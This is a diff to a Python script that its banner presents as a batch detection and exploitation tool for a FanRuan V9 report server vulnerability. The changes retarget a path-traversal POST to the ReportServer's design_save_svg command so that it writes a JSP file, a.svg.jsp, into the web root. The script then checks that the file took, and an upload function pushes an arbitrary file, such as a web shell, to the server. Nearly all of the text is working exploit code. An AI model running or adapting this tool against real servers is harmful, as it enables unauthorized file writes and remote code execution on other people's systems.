@@ -17,14 +17,14 @@ def fanruan(url):
     data={"__CONTENT__":randnum,"__CHARSET__":"UTF-8"}
     #print(data)
     try:
-        r=requests.post(url+'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp',headers=head,data=dumps(data),proxies=proxy)
+        r=requests.post(url+'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp',headers=head,data=dumps(data),proxies=proxy)
         # 获取文件内容
-        r=requests.get(url+'/WebReport/update.jsp')
+        r=requests.get(url+'/WebReport/a.svg.jsp')
         #print(r.text)
         if randnum in r.text:
-            print('[+]',url,'存在任意文件覆盖漏洞！')
+            print('[+]',url,'存在任意文件上传漏洞！')
             if args.o:
-                args.o.write(url+' 任意文件覆盖漏洞\n')
+                args.o.write(url+' 任意文件上传漏洞\n')
             return True
     except:
         return
@@ -39,8 +39,8 @@ def upload(url,file):
     data={"__CONTENT__":file.read(),"__CHARSET__":"UTF-8"}
     #print(data)
     try:
-        r=requests.post(url+'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp',headers=head,data=dumps(data),proxies=proxy)
-        print('[+] 覆盖文件:',url+'/WebReport/update.jsp')
+        r=requests.post(url+'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp',headers=head,data=dumps(data),proxies=proxy)
+        print('[+] 覆盖文件:',url+'/WebReport/a.svg.jsp')
     except:
         return
 
@@ -59,7 +59,7 @@ args=parser.parse_args()
 banner='''
 #################################################
 ####                                         ####
-####  帆软 V9 任意文件覆盖漏洞批量检测及利用 ####
+####  帆软 V9 任意文件上传漏洞批量检测及利用 ####
 ####                                         ####
 #################################################
 '''
